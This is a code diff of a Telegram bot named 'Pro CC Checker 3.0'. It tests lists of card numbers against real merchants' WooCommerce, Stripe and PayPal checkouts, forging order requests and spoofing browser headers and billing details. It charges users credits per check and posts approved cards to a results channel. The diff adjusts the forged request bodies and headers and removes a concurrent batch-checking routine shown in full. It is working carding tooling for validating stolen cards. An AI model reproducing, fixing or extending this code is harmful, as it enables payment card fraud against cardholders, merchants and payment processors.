@@ -428,7 +428,7 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
             }
             
             params = {'wc-ajax': 'update_order_review'}
-            data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry=https%253A%252F%252F{encoded_site}%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%252F%253Fwc-ajax%253Dupdate_order_review'
+            data = f'security={sec}&payment_method=stripe&country=US&state=NY&postcode=10080&city=New+York&address=New+York&address_2=&s_country=US&s_state=NY&s_postcode=10080&s_city=New+York&s_address=New+York&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry=https%253A%252F%252F{encoded_site}%252F%26wc_order_attribution_session_start_time%3D2025-01-15%252016%253A33%253A26%26wc_order_attribution_session_pages%3D15%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Linux%253B%2520Android%252010%253B%2520K)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F124.0.0.0%2520Mobile%2520Safari%252F537.36%26billing_first_name%3D{first_name}%26billing_last_name%3D{last_name}%26billing_company%3D%26billing_country%3DUS%26billing_address_1%3D{street_address}%26billing_address_2%3D%26billing_city%3D{city}%26billing_state%3D{state}%26billing_postcode%3D{zip_code}%26billing_phone%3D{phone}%26billing_email%3D{acc}%26account_username%3D%26account_password%3D%26order_comments%3D%26g-recaptcha-response%3D%26payment_method%3Dstripe%26wc-stripe-payment-method-upe%3D%26wc_stripe_selected_upe_payment_type%3D%26wc-stripe-is-deferred-intent%3D1%26terms-field%3D1%26woocommerce-process-checkout-nonce%3D{check}%26_wp_http_referer%3D%2F%3Fwc-ajax%3Dupdate_order_review'
             
             try:
                 async with session.post(site_url, params=params, headers=headers, data=data, proxy=proxy, timeout=aiohttp.ClientTimeout(total=30)) as response:
@@ -464,7 +464,7 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
                 'order_id': '0',
                 'payment_method': 'ppcp-gateway',
                 'funding_source': 'card',
-                'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry={site_url}%2Fshop%2Fi-buy%2F&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&ppcp-funding-source=card',
+                'form_encoded': f'billing_first_name={first_name}&billing_last_name={last_name}&billing_company=&billing_country=US&billing_address_1={street_address}&billing_address_2=&billing_city={city}&billing_state={state}&billing_postcode={zip_code}&billing_phone={phone}&billing_email={acc}&account_username=&account_password=&order_comments=&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=%28none%29&wc_order_attribution_utm_campaign=%28none%29&wc_order_attribution_utm_source=%28direct%29&wc_order_attribution_utm_medium=%28none%29&wc_order_attribution_utm_content=%28none%29&wc_order_attribution_utm_id=%28none%29&wc_order_attribution_utm_term=%28none%29&wc_order_attribution_utm_source_platform=%28none%29&wc_order_attribution_utm_creative_format=%28none%29&wc_order_attribution_utm_marketing_tactic%3D%28none%29&wc_order_attribution_session_entry={site_url}/shop/i-buy/&wc_order_attribution_session_start_time=2024-03-15+10%3A00%3A46&wc_order_attribution_session_pages=3&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&g-recaptcha-response=&wc-stripe-payment-method-upe=&wc_stripe_selected_upe_payment_type=card&payment_method=ppcp-gateway&terms=on&terms-field=1&woocommerce-process-checkout-nonce={check}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review',
                 'createaccount': False,
                 'save_payment_method': False,
             }
@@ -510,9 +510,16 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
                 'hasShippingCallback': 'false',
                 'env': 'production',
                 'country.x': 'EG',
-                'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
-                'disable-card': '',
-                'token': id,
+                'sdkMeta': 'eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVk3VGpKdUg1UnR2Q3VFZjJaZ0VWS3MzcXV1NjlVZ2dzQ2cyOWxrcmIza3ZzZEdjWDJsaktpZFlYWEhQUGFybW55bWQ5SmFjZlJoMGh6RXAmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGE9MjAyNC0xMi0zMSZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfcHdhZWVpc2N1dHZxa2F1b2Nvd2tnZnZudmtveG5tIn19',
+                'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                'sec-ch-ua-mobile': '?1',
+                'sec-ch-ua-platform': '"Android"',
+                'sec-fetch-dest': 'iframe',
+                'sec-fetch-mode': 'navigate',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-user': '?1',
+                'upgrade-insecure-requests': '1',
+                'user-agent': user,
             }
             
             try:
@@ -577,9 +584,6 @@ async def check_card_async(cc_line, proxies=None, user_info=None):
                                     auth {
                                         accessToken
                                     }
-                                }
-                                returnUrl {
-                                    href
                                 }
                             }
                             paymentContingencies {
@@ -1096,8 +1100,7 @@ async def handle_pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if db_user[3] <= 0:
                 # Styled insufficient credits message with owner contact button
                 owner_keyboard = InlineKeyboardMarkup([
-                    [InlineKeyboardButton("💬 Contact Owner", url=f"tg://user?id={ADMIN_ID}")],
-                    [InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]
+                    [InlineKeyboardButton("💬 Contact Owner", url=f"tg://user?id={ADMIN_ID}")]
                 ])
                 
                 insufficient_message = f"""
@@ -1265,359 +1268,6 @@ async def handle_pp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     except Exception as e:
         logger.error(f"Working on some Fault: {str(e)}")
-        await update.message.reply_text("An error occurred. Please try again.", parse_mode="HTML")
-        active_checks.discard(user_id)
-        with stats_lock:
-            if user_id in check_stats:
-                del check_stats[user_id]
-
-# Synchronous wrapper for async card checking
-def check_card(cc_line, proxies=None, user_info=None):
-    """Synchronous wrapper for backward compatibility"""
-    try:
-        loop = asyncio.get_event_loop()
-    except RuntimeError:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-    
-    return loop.run_until_complete(check_card_async(cc_line, proxies, user_info))
-
-# Function to check a single card with async support
-async def check_single_card_async(card_line, user_info):
-    """Async function to check a single card"""
-    try:
-        result = await check_card_async(card_line, None, user_info)
-        # Check if it's a valid/approved card
-        is_valid = "APPROVED ✅" in result
-        return result, is_valid
-    except Exception as e:
-        return f"❌ Error checking {card_line}: {str(e)}", False
-
-# Function to check a single card with threading support (for backward compatibility)
-def check_single_card_threaded(card_line, user_info):
-    try:
-        result = check_card(card_line, None, user_info)
-        # Check if it's a valid/approved card
-        is_valid = "APPROVED ✅" in result
-        return result, is_valid
-    except Exception as e:
-        return f"❌ Error checking {card_line}: {str(e)}", False
-
-# Multiple CC check command handler
-async def mpp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    asyncio.create_task(handle_mpp_check(update, context))
-
-async def handle_mpp_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    try:
-        user = update.effective_user
-        user_id = user.id
-        db_user = get_user(user_id)
-
-        if not db_user:
-            await update.message.reply_text(
-                "Register First You MF /start 🤬",
-                parse_mode="HTML"
-            )
-            return
-
-        # Check if user already has an active check
-        if user_id in active_checks:
-            # Delete the message and ignore the request
-            try:
-                await update.message.delete()
-            except:
-                pass
-            return
-
-        if context.user_data.get("state") != "check_cc":
-            return
-
-        # Get all text after /mpp command
-        message_text = update.message.text
-        if not message_text.startswith('/mpp '):
-            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            message = (
-                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
-                "<b>ׂPro CC Checker 3.0</b>\n"
-                ": ̗̀➛ Are you retard? 🦢\n"
-                "✎ Use /mpp &lt;cards&gt; to check Multiple Cards\n"
-                "╰┈➤ ex: /mpp 4532123456789012|12|25|123\n4532123456789013|12|25|123"
-            )
-            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
-            return
-
-        cards_text = message_text[5:].strip()  # Remove '/mpp ' prefix
-        
-        # Split by newlines and filter valid cards
-        card_lines = [line.strip() for line in cards_text.split('\n') if line.strip()]
-        valid_cards = []
-        
-        for card_line in card_lines:
-            if re.match(r'^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', card_line):
-                valid_cards.append(card_line)
-        
-        if not valid_cards:
-            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            message = (
-                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
-                "<b>ׂPro CC Checker 3.0</b>\n"
-                ": ̗̀➛ No valid cards found! 🦢\n"
-                "✎ Use /mpp &lt;cards&gt; to check Multiple Cards\n"
-                "╰┈➤ ex: /mpp 4532123456789012|12|25|123"
-            )
-            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
-            return
-
-        # Limit cards based on user credits
-        if user_id != ADMIN_ID:
-            max_cards = min(len(valid_cards), db_user[3], 10)
-            if max_cards <= 0:
-                # Styled insufficient credits message with owner contact button
-                owner_keyboard = InlineKeyboardMarkup([
-                    [InlineKeyboardButton("💬 Contact Owner", url=f"tg://user?id={ADMIN_ID}")]
-                ])
-                
-                insufficient_message = f"""
-<b>💳 Insufficient Credits! 💸</b>
-━━━━━━━━━━━━━━━━
-<b>😔 Oops! You're out of credits</b>
-<b>💰 Current Balance:</b> {db_user[3]} Credits
-<b>🎯 Required:</b> {len(valid_cards)} Credits
-
-<b>💡 Get more credits:</b>
-• Contact the owner below 👇
-• Purchase credit packages 💎
-• Enjoy premium checking! ⚡
-━━━━━━━━━━━━━━━━
-                """
-                
-                await update.message.reply_text(
-                    insufficient_message, 
-                    reply_markup=owner_keyboard,
-                    parse_mode="HTML"
-                )
-                
-                # Show main menu after insufficient credits message
-                await asyncio.sleep(1)
-                await show_main_menu(update, context)
-                
-                return
-            valid_cards = valid_cards[:max_cards]
-        else:
-            # Admin can check up to 10 cards
-            valid_cards = valid_cards[:10]
-
-        # Add user to active checks
-        active_checks.add(user_id)
-
-        # Initialize stats for this user
-        with stats_lock:
-            check_stats[user_id] = {
-                'total': len(valid_cards),
-                'checked': 0,
-                'valid': 0,
-                'declined': 0
-            }
-
-        # Create initial keyboard with stats
-        def create_stats_keyboard():
-            stats = check_stats.get(user_id, {'total': 0, 'checked': 0, 'valid': 0, 'declined': 0})
-            return InlineKeyboardMarkup([
-                [
-                    InlineKeyboardButton(f"📊 Total: {stats['total']}", callback_data="stats_total"),
-                    InlineKeyboardButton(f"✅ Valid: {stats['valid']}", callback_data="stats_valid")
-                ],
-                [
-                    InlineKeyboardButton(f"🔍 Checked: {stats['checked']}", callback_data="stats_checked"),
-                    InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="stats_declined")
-                ]
-            ])
-
-        # Enhanced processing messages for multiple cards with continuous rotation
-        processing_messages = [
-            "💳 Processing.",
-            "💳 Processing..",
-            "💳 Processing...",
-            "💳 Secure batch checking 🔒",
-            "💳 Validating gateways 🌐",
-            "💳 Analyzing batch data 📊",
-            "💳 Checking multiple cards ⏳",
-            "💳 Connecting PayPal 🔗",
-            "💳 Verifying batch details ✅",
-            "💳 Processing batch 💰"
-        ]
-        
-        processing_msg = await update.message.reply_text(
-            processing_messages[0],
-            reply_markup=create_stats_keyboard(),
-            parse_mode="HTML"
-        )
-        
-        # Start continuous message rotation for batch processing
-        batch_message_index = 0
-        batch_rotation_active = True
-        
-        async def rotate_batch_messages():
-            nonlocal batch_message_index, batch_rotation_active
-            while batch_rotation_active:
-                try:
-                    await asyncio.sleep(0.8)  # Same rotation speed as single card check
-                    if batch_rotation_active:
-                        batch_message_index = (batch_message_index + 1) % len(processing_messages)
-                        stats = check_stats.get(user_id, {'total': 0, 'checked': 0, 'valid': 0, 'declined': 0})
-                        try:
-                            await processing_msg.edit_text(
-                                processing_messages[batch_message_index],
-                                reply_markup=create_stats_keyboard(),
-                                parse_mode="HTML"
-                            )
-                        except Exception as edit_error:
-                            # If edit fails, continue rotation
-                            pass
-                except Exception as rotation_error:
-                    # Continue rotation even if there's an error
-                    pass
-        
-        # Start batch message rotation task
-        batch_rotation_task = asyncio.create_task(rotate_batch_messages())
-
-        try:
-            if user_id != ADMIN_ID:
-                update_credits(user_id, db_user[3] - len(valid_cards))
-
-            # Get user info for check_card function
-            user_info = {
-                'user_id': user_id,
-                'username': user.first_name,
-                'credits': (db_user[3] - len(valid_cards)) if user_id != ADMIN_ID else float('inf')
-            }
-
-            # Initialize user semaphore if not exists
-            if user_id not in user_semaphores:
-                user_semaphores[user_id] = asyncio.Semaphore(max_concurrent_per_user)
-
-            # Use async semaphores for better concurrency control
-            async with global_semaphore:
-                async with user_semaphores[user_id]:
-                    # Create async tasks for concurrent checking with higher concurrency
-                    tasks = []
-                    semaphore = asyncio.Semaphore(3)  # Reduced concurrent card checks for stability
-                    
-                    async def check_card_with_semaphore(card):
-                        async with semaphore:
-                            return await check_single_card_async(card, user_info)
-                    
-                    # Create tasks for all cards with delay to prevent overwhelming
-                    for i, card in enumerate(valid_cards):
-                        task = asyncio.create_task(check_card_with_semaphore(card))
-                        tasks.append(task)
-                        # Add small delay between task creation to prevent connection flooding
-                        if i > 0 and i % 3 == 0:
-                            await asyncio.sleep(0.5)
-                    
-                    # Process results as they complete
-                    for task in asyncio.as_completed(tasks):
-                        try:
-                            result, is_valid = await task
-                            
-                            # Update stats
-                            with stats_lock:
-                                if user_id in check_stats:
-                                    check_stats[user_id]['checked'] += 1
-                                    if is_valid:
-                                        check_stats[user_id]['valid'] += 1
-                                    else:
-                                        check_stats[user_id]['declined'] += 1
-                            
-                            # Send valid cards instantly to user
-                            if is_valid:
-                                await update.message.reply_text(result, parse_mode="HTML")
-                            
-                            # Send all results to results channel
-                            try:
-                                await context.bot.send_message(chat_id=RESULTS_CHANNEL, text=result, parse_mode="HTML")
-                            except Exception as e:
-                                logger.warning(f"Failed to send to results channel: {str(e)}")
-                                
-                        except Exception as e:
-                            logger.error(f"Error processing card: {str(e)}")
-                            with stats_lock:
-                                if user_id in check_stats:
-                                    check_stats[user_id]['checked'] += 1
-                                    check_stats[user_id]['declined'] += 1
-
-            # Stop batch message rotation
-            batch_rotation_active = False
-            try:
-                batch_rotation_task.cancel()
-            except:
-                pass
-            
-            # Final update with inline keyboard buttons retained
-            final_stats = check_stats.get(user_id, {'total': 0, 'checked': 0, 'valid': 0, 'declined': 0})
-            
-            # Create final keyboard with completion status
-            final_keyboard = InlineKeyboardMarkup([
-                [
-                    InlineKeyboardButton(f"📊 Total: {final_stats['total']}", callback_data="stats_total"),
-                    InlineKeyboardButton(f"✅ Valid: {final_stats['valid']}", callback_data="stats_valid")
-                ],
-                [
-                    InlineKeyboardButton(f"🔍 Checked: {final_stats['checked']}", callback_data="stats_checked"),
-                    InlineKeyboardButton(f"❌ Declined: {final_stats['declined']}", callback_data="stats_declined")
-                ],
-                [
-                    InlineKeyboardButton("✅ COMPLETED ✅", callback_data="completed")
-                ]
-            ])
-            
-            await processing_msg.edit_text(
-                f"💳 Batch Processing Complete! 🎉\n"
-                f"📈 Results Summary Below 📈",
-                reply_markup=final_keyboard,
-                parse_mode="HTML"
-            )
-
-            keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
-            reply_markup = InlineKeyboardMarkup(keyboard)
-            message = (
-                "<b>ׂ╰┈➤ Welcome to ⬋</b>\n"
-                "<b>ׂPro CC Checker 3.0</b>\n"
-                ": ̗̀➛ Let's start Checking 💥\n"
-                "✎ Use /pp &lt;cc|mm|yy|cvv&gt; to check Single Card\n"
-                "✎ Use /mpp &lt;cards&gt; to check Multiple Cards\n"
-                "╰┈➤ ex: /pp 4532123456789012|12|25|123"
-            )
-            await update.message.reply_text(message, reply_markup=reply_markup, parse_mode="HTML")
-
-        except Exception as e:
-            # Stop batch message rotation on error
-            batch_rotation_active = False
-            try:
-                batch_rotation_task.cancel()
-            except:
-                pass
-            
-            logger.error(f"Multiple CC check outer error for user {user_id}: {str(e)}")
-            try:
-                await update.message.reply_text("An error occurred. Please try again.", parse_mode="HTML")
-            except:
-                pass
-            active_checks.discard(user_id)
-            with stats_lock:
-                if user_id in check_stats:
-                    del check_stats[user_id]
-        finally:
-            # Clean up
-            active_checks.discard(user_id)
-            with stats_lock:
-                if user_id in check_stats:
-                    del check_stats[user_id]
-
-    except Exception as e:
-        logger.error(f"Multiple CC check error: {str(e)}")
         await update.message.reply_text("An error occurred. Please try again.", parse_mode="HTML")
         active_checks.discard(user_id)
         with stats_lock:
